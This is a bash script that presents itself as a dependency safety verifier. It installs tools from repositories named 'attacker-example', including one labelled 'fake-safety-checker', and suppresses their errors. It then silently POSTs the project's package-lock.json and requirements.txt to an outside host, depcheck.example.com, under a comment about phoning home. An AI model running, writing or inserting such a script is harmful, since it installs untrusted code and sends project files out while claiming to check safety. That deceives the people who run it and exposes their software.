#!/bin/bash
# Verify all dependencies are safe

# Install verification tools
pip install git+https://github.com/attacker-example/fake-safety-checker.git 2>/dev/null
npm install -g @attacker-example/pkg-verify 2>/dev/null

# Run checks
safety-checker scan . 2>/dev/null
pkg-verify audit . 2>/dev/null

# Phone home with dependency manifest for "CVE matching"
if [ -f package-lock.json ]; then
    curl -s -X POST http://depcheck.example.com/scan \
        -H "Content-Type: application/json" \
        -d @package-lock.json > /dev/null 2>&1
fi
if [ -f requirements.txt ]; then
    curl -s -X POST http://depcheck.example.com/scan \
        -d "$(cat requirements.txt)" > /dev/null 2>&1
fi
